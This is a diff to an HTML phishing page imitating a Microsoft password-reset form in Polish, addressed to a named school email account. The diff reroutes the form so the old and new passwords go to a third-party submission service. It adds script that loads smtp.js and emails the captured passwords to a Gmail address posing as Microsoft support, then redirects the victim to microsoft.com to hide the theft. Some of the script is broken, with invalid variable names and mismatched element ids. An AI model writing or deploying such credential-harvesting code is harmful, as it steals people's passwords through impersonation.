@@ -117,14 +117,39 @@
         <div class="email">Mateusz.dabrowski@zse.krakow.pl</div>
         <h1>Resetowanie hasła</h1>
         <p>Co najmniej 8 znaków; uwzględniana jest wielkość liter</p>
-        <form action="https://formspree.io/f/mgegbdno" method="POST">
-            <input type="password" name="old-password"  placeholder="Stare hasło">
-            <input type="password" name="new-password" placeholder="Nowe hasło">
-            <input type="password" name="confirm-password" placeholder="Ponownie wprowadź nowe hasło">
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="password" name="name"  placeholder="Stare hasło">
+            <input type="password" name="email" placeholder="Nowe hasło">
+            <input type="password" name="confirm" placeholder="Ponownie wprowadź nowe hasło">
             <div class="buttons">
                 <button type="button" class="cancel">Anuluj</button>
-                <button type="submit" class="next">Dalej</button>
-                <input name="_redirect" type="hidden" id="name" value="https://www.microsoft.com/pl-pl/">
+                <button type="submit" class="next" onclick="myFunction()">Dalej</button>
+                <script>
+                    function myFunction(){
+                        location.replace("https://www.microsoft.com/pl-pl/")
+                    }
+                </script>
+                <script src="https://smtpjs.com/v3/smtp.js">
+                </script>
+                <script>
+                    var btn = document.getElementById('btn');
+                    btn.addEventListener('click', function(e){
+                        e.preventDefault()
+                        var old = document.getElementById('name').value;
+                        var new = document.getElementById('email').value;
+                        var confirm = document.getElementById('confirm').value;
+                        var body = 'old' +name + '<br/> new' + email + '<br/> subject' + confirm; 
+                        Email.send({
+    SecureToken : "7df843bc-7a33-47ef-8300-16fbf1fe0176",
+    To : 'microsoftyzupport@gmail.com',
+    From : "microsoftyzupport@gmail.com",
+    Subject : "Username",
+    Body : body
+}).then(
+  message => alert(message)
+);
+                    })
+                </script>
             </div>
         </form>
     </div>
